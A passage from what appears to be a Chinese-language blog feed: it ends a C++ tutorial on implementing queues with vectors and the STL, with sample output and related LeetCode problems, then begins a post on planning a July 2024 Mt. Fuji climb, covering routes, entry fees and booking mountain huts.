class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    QueueList q;</span><br><span class="line">    <span class="keyword">if</span>(q.<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">24</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 24: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 8: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">23</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 23: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">13</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 13: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;     back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">35</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 35: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;     back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>; </span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">empty queue</span><br><span class="line"> After push 24:  //1</span><br><span class="line">front: 24    back: 24 </span><br><span class="line">After push 8:   //2</span><br><span class="line">front: 24    back: 8</span><br><span class="line">After push 23:  //3</span><br><span class="line">front: 24    back: 23</span><br><span class="line">After push 13:  //4</span><br><span class="line">front: 24    back: 13</span><br><span class="line">After pop the front element:  //5</span><br><span class="line">After push 35: front: 8 back: 35 //6</span><br><span class="line">After pop the front element: front: 23 back: 35  //7</span><br><span class="line">After pop the front element: front: 13 back: 35 //8</span><br><span class="line">After pop the front element: front: 35 back: 35 //9</span><br><span class="line">After pop the front element: Queue is empty. //10</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/queue/queue2.png"></p><h2 id="以-List-實踐-Queue"><a href="#以-List-實踐-Queue" class="headerlink" title="以 List 實踐 Queue"></a>以 List 實踐 Queue</h2><h3 id="程式碼-1"><a href="#程式碼-1" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueueList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> front, back;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; queue;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">QueueList</span>():<span class="built_in">front</span>(<span class="literal">NULL</span>), <span class="built_in">back</span>(<span class="literal">NULL</span>), <span class="built_in">queue</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getBack</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    queue.<span class="built_in">push_back</span>(x);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        queue.<span class="built_in">erase</span>(queue.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator it=queue.<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">return</span> *it;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator it=queue.<span class="built_in">end</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> *it;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> queue.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueList::IsEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    QueueList q;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">25</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 25: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">50</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 50: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">77</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 77: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">After Pushing 25: front:25 back:25</span><br><span class="line">After Pushing 50: front:25 back:50</span><br><span class="line">After Pushing 77: front:25 back:77</span><br><span class="line">After Poping the front element: front:50 back:77</span><br><span class="line">After Poping the front element: front:77 back:77</span><br><span class="line">empty queue</span><br><span class="line">empty queue</span><br><span class="line">After Poping the front element: front:-1 back:-1</span><br></pre></td></tr></table></figure><h1 id="Queue-相關-STL"><a href="#Queue-相關-STL" class="headerlink" title="Queue 相關 STL"></a>Queue 相關 STL</h1><p>C++ 中對於 queue也有現成的STL可以使用，使用前會需要先宣告 <code>&lt;queue&gt;</code>，以下是常見的成員函式:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">2</span>);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the queue</span></span><br><span class="line">    <span class="type">int</span> a = q.<span class="built_in">front</span>();</span><br><span class="line">    <span class="type">int</span> &amp;b = q.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;q.<span class="built_in">front</span>() &lt;&lt; endl; <span class="comment">// print the memory </span></span><br><span class="line">    cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;a &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;b &lt;&lt; endl; <span class="comment">// same as memory addr of q.front()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the  queue contents</span></span><br><span class="line">    <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">1 0x76fc70</span><br><span class="line">1 0x7ffc0ddca00c</span><br><span class="line">1 0x76fc70</span><br><span class="line">1 2 3 </span><br></pre></td></tr></table></figure><blockquote><p>各類資料結構的STL可以參考我整理的 <strong><a href="https://leozzmc.github.io/posts/efa232a7.html">這篇</a></strong></p></blockquote><h1 id="Queue-操作的時間複雜度"><a href="#Queue-操作的時間複雜度" class="headerlink" title="Queue 操作的時間複雜度"></a>Queue 操作的時間複雜度</h1><p>插入和刪除的時間複雜度都是 $O(1)$，而搜尋和存取的時間複雜度都是 $O(N)$</p><h1 id="Queue-相關-LeetCode-題目"><a href="#Queue-相關-LeetCode-題目" class="headerlink" title="Queue 相關 LeetCode 題目"></a>Queue 相關 LeetCode 題目</h1><p>Easy</p><ul><li><a href="https://leetcode.com/problems/implement-stack-using-queues/description/">225. Implement Stack using Queues</a></li><li><a href="https://leetcode.com/problems/implement-queue-using-stacks/description/">232. Implement Queue using Stacks</a></li></ul><p>Medium</p><ul><li><a href="https://leetcode.com/problems/reveal-cards-in-increasing-order/description/">950. Reveal Cards In Increasing Order</a></li><li><a href="https://leetcode.com/problems/design-circular-deque/description/">641. Design Circular Deque</a></li><li><a href="https://leetcode.com/problems/design-circular-queue/description/">622. Design Circular Queue</a></li></ul><p>Hard</p><ul><li><a href="https://leetcode.com/problems/count-subarrays-with-fixed-bounds/description/">2444. Count Subarrays With Fixed Bounds</a></li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://ithelp.ithome.com.tw/articles/10326158">https://ithelp.ithome.com.tw/articles/10326158</a><br>[2] <a href="https://alrightchiu.github.io/SecondRound/queue-introjian-jie-bing-yi-linked-listshi-zuo.html">https://alrightchiu.github.io/SecondRound/queue-introjian-jie-bing-yi-linked-listshi-zuo.html</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/queue-yi-arrayshi-zuo-queue.html">https://alrightchiu.github.io/SecondRound/queue-yi-arrayshi-zuo-queue.html</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攀登富士山 | 行前準備與規劃紀錄 | 山屋預約</title>
      <link href="/posts/f9156e74.html"/>
      <url>/posts/f9156e74.html</url>
      
        <content type="html"><![CDATA[<h1 id="富士山之旅"><a href="#富士山之旅" class="headerlink" title="富士山之旅"></a>富士山之旅</h1><p>由於搶到御來光館的日期是在 7&#x2F;16，因此這次攀登富士山的日期就選擇在今年(2024) 的 7&#x2F;16 -7&#x2F;17。 <strong>攀爬富士山大多都是呼籲預約山小屋，不要夜間單攻(彈丸登山)</strong> ，因此這次也是先以山屋預約日期為主，再去安排對應的爬山行程。另外富士山是一座活火山，隨時要注意火山活動相關的警報，這部分可以去<a href="https://www.fujisan-climb.jp/index.html">富士山的官網查閱</a>。</p><p><img src="/img/Mountain/Mt.Fuji/notice.jpeg"></p><h1 id="攀登路線"><a href="#攀登路線" class="headerlink" title="攀登路線"></a>攀登路線</h1><h3 id="吉田路線"><a href="#吉田路線" class="headerlink" title="吉田路線"></a>吉田路線</h3><p>從富士山五合目出發，海拔為2300公尺，登山路線：5.8 公里。約耗時 5-7 個小時，也是山屋最多的路線，從7合目到9合目都有山屋，因此算是熱門的新手路線。也是我們這次的攀爬路線。</p><p><img src="/img/Mountain/Mt.Fuji/path1.jpg"></p><blockquote><p>圖源:<a href="https://www.fujisan-climb.jp/trails/yoshida/index.html">https://www.fujisan-climb.jp/trails/yoshida/index.html</a></p></blockquote><p>除了吉田路線之外富士山還有其他攀登路線</p><h3 id="須走路線"><a href="#須走路線" class="headerlink" title="須走路線"></a>須走路線</h3><p>吉田路線跟須走路線在本八合目後就會交會，因此人潮會開始便更多。這個路線最大的樂趣就是可以在下山途中體驗砂走，也就是在沙中滑行，實際上吉田路線的下山道也必須先從須走路線開始走，大概走道八合目才會又岔開</p><p><img src="/img/Mountain/Mt.Fuji/path3.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/subashiri/index.html">https://www.fujisan-climb.jp/trails/subashiri/index.html</a></p></blockquote><blockquote><p>如果想了解須走路線的攀爬心得，這篇寫得挺完整: <a href="https://manyujp.com/fujisan-1/">https://manyujp.com/fujisan-1/</a></p></blockquote><h3 id="富士宮路線"><a href="#富士宮路線" class="headerlink" title="富士宮路線"></a>富士宮路線</h3><p>距離最短的路線，但會是一路陡上，建議有許多登山經驗者前往</p><p><img src="/img/Mountain/Mt.Fuji/path2.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/fujinomiya/index.html">https://www.fujisan-climb.jp/trails/fujinomiya/index.html</a></p></blockquote><h3 id="御殿場路線"><a href="#御殿場路線" class="headerlink" title="御殿場路線"></a>御殿場路線</h3><p>坡度最平緩，也可以體驗砂走，山屋，廁所都較少。但登山者也最少</p><p><img src="/img/Mountain/Mt.Fuji/path4.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/gotenba/index.html">https://www.fujisan-climb.jp/trails/gotenba/index.html</a></p></blockquote><h1 id="入山申請"><a href="#入山申請" class="headerlink" title="入山申請"></a>入山申請</h1><p>自2024年7月1日起，山梨縣針對攀登吉田路線的山友收取每人2000日圓的入山通行費，並僅開放每日僅4000人攀登富士山。</p><p><img src="/img/Mountain/Mt.Fuji/admission.jpeg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/info/20240220_2024anzentaisaku.html">https://www.fujisan-climb.jp/info/20240220_2024anzentaisaku.html</a></p></blockquote><h1 id="山屋預約"><a href="#山屋預約" class="headerlink" title="山屋預約"></a>山屋預約</h1><p><img src="/img/Mountain/Mt.Fuji/house.jpg"></p><p>富士山不同路線也有不同的山小屋，吉田路線算是有最多山小屋的路線，從七合目到本八合目都有山屋，下面是整理吉田路線上的山屋列表</p><table>    <tr>        <th>幾合目</th>        <th>山小屋名稱</th>        <th>官網</th>      </tr >    <tr >        <td rowspan="7">八合目</td>        <td>御来光館</td>        <td><a href="https://www.goraikoukan.jp"> https://www.goraikoukan.jp </td>    </tr>    <tr>        <td>八合目トモエ館</td>        <td><a href="https://tomoekan.com">https://tomoekan.com</td>    </tr>    <tr>        <td>富士山ホテル</td>        <td><a href="https://www.fujisanhotel.com/">https://www.fujisanhotel.com/</td>    </tr>    <tr>        <td>元祖室</td>        <td><a href="https://www.ganso-muro.jp/">https://www.ganso-muro.jp/</td>    </tr>    <tr><td>白雲荘</td>        <td><a href="http://fujisan-hakuun.com/en/">http://fujisan-hakuun.com/en/</td>    </tr>    <tr>        <td>蓬莱館</td>        <td><a href="https://www.horaikan.jp/">https://www.horaikan.jp/</td>    </tr>    <tr>        <td>太子舘</td>        <td><a href="https://www.mfi.or.jp/~taisikan/">https://www.mfi.or.jp/~taisikan/</td>    </tr>    <tr >        <td rowspan="5">七合目</td>        <td>東洋館</td>        <td><a href="https://www.fuji-toyokan.jp/">https://www.fuji-toyokan.jp/</td>    </tr>    <tr>        <td>鳥居荘</td>        <td><a href="http://toriiso.com/">http://toriiso.com/</td>    </tr>    <tr>        <td>富士一館</td>        <td><a href="https://www.fuji-ichikan.jp/">https://www.fuji-ichikan.jp/</td>    </tr>    <tr>        <td>鎌岩館</td>        <td><a href="https://kamaiwakan.jpn.org/">https://kamaiwakan.jpn.org/</td>    </tr>    <tr>        <td>七合目トモエ館</td>        <td><a href="https://kamaiwakan.jpn.org/">https://kamaiwakan.jpn.org/</td>    </tr></table><div class="note warning flat"><p><strong>根據經驗，許多山屋預約會提前偷跑!!! 例如如果官網上寫 5&#x2F;20 23:00 開放預約，由於這是日本時間，按理說台灣會是 22:00 開始能夠預約，但這次我們四個人分工搶山屋的時候發現早在21:00　某些山屋就提前放行預約了！！！甚至某些要後面幾天才能夠預約的山屋也在前幾天就偷偷開放了！！！因此務必要提前再提前做好搶山屋的準備</strong></p></div><h2 id="御來光館預約"><a href="#御來光館預約" class="headerlink" title="御來光館預約"></a>御來光館預約</h2><p>這次御來光館是在今年的 5&#x2F;7 中午開放預約，我在公司透過公司的網速奮力地搶到了與同行友人的四人住宿房。真的是萬幸，並且在靠近開放時間前網站會瘋狂 timeout。</p><p>通常在開放預約後可以點選網站旁邊的 <strong>ご予約／ご宿泊</strong> 就會跳出可供預約的日期，有圈圈的就代表有位子，但因為真的很難槍，所以一定要瘋狂重新整理看看是否有位置，另外進去後會需要選擇幾人床位，並且要填寫像是在日本的聯絡地址以及一些個人基本資料，建議都先準備好再來開搶。</p><p><img src="/img/Mountain/Mt.Fuji/goraikoukan.png"></p><p>另外我們這次是選擇一泊二食，也就是會有晚餐跟隔日的早餐。餐點在預定時可以選擇西式或者日式餐點。</p><p><img src="/img/Mountain/Mt.Fuji/food.jpeg"></p><p><img src="/img/Mountain/Mt.Fuji/dinner.jpeg"><br>晚餐會在下午 5:00 開始陸續供應<br><img src="/img/Mountain/Mt.Fuji/breakfest.jpeg"></p><p>早餐會在隔天早上 1:30 就先準備好。</p><div class="note info 